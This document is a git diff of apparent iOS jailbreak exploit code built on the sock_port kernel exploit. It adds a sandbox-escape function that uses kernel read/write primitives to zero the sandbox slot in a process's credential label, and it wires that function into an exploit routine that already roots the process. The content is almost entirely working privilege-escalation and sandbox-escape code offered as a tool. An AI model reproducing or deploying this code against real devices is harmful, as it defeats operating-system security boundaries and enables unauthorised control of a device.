@@ -18,6 +18,8 @@
 #include "../sock_port/offsets.h"
 #include "../PatchFinder/patchfinder64.h"
 #include "../Kernel Utilities/kernel_utils.h"
+#include "../Kernel Utilities/kexecute.h"
+
 mach_port_t tfp0 = 0;
 uint64_t KernelBase;
 
@@ -29,7 +31,7 @@ int exploit_init(){
         init_kernel_utils(tfp0);
         KernelBase = grabKernelBase();
         if (!KernelBase) {
-            printf("[-] failed to find kernel base\n");
+            printf("[-] Failed to find kernel base\n");
             return 2;
         }
         kernel_slide = (uint32_t)(KernelBase - 0xFFFFFFF007004000);
@@ -41,6 +43,10 @@ int exploit_init(){
         printf("[+] Initialized patchfinder\n");
         findOurOwnProcess();
         rootifyOurselves();
+        escapeSandboxForProcess(getpid());
+        init_Kernel_Execute();
+        term_Kernel_Execute();
+        term_kernel();
         return 0;
     } else {
         printf("[!] Could not get tfp0!\n");
@@ -75,11 +81,41 @@ int rootifyOurselves(){
         printf("[i] Successfully got ROOT!\n");
     } else {
         printf("[i] Failed to get ROOT!\n");
-        term_kernel();
         return -1;
     }
-    term_kernel();
     return 0;
+}
+
+uint64_t escapeSandboxForProcess(pid_t proc_pid) {
+    printf("[i] Preparing to escape the sandbox...\n");
+    uint64_t target_process;
+    uint64_t ucred;
+    uint64_t sb_cr_label;
+    uint64_t default_creds;
+    
+    if (proc_pid == 0) {
+         printf("[!] Will NOT mess with Kernel's PID...\n");
+        return -2;
+    }
+    
+    target_process = proc_of_pid(proc_pid);
+    ucred = rk64(target_process + off_p_ucred);
+    sb_cr_label = rk64(ucred + off_ucred_cr_label);
+    default_creds = rk64(sb_cr_label + off_sandbox_slot);
+    wk64(sb_cr_label + off_sandbox_slot, 0);
+    
+    /*
+     As far as I am aware, the first slot is used by AMFI. Sandbox should be the second.
+     Read Jonathan Levin's book on the Sandbox chaper for more details about the credentials.
+     */
+    
+    if (rk64(rk64(ucred + off_ucred_cr_label) + off_sandbox_slot) == 0){
+        printf("[+] Successfully escaped the Sandbox!\n");
+        return 0;
+    } else {
+        printf("[-] Failed to escape the Sandbox!\n");
+        return -1;
+    }
 }
 
 int rootifyProcessByPid(){
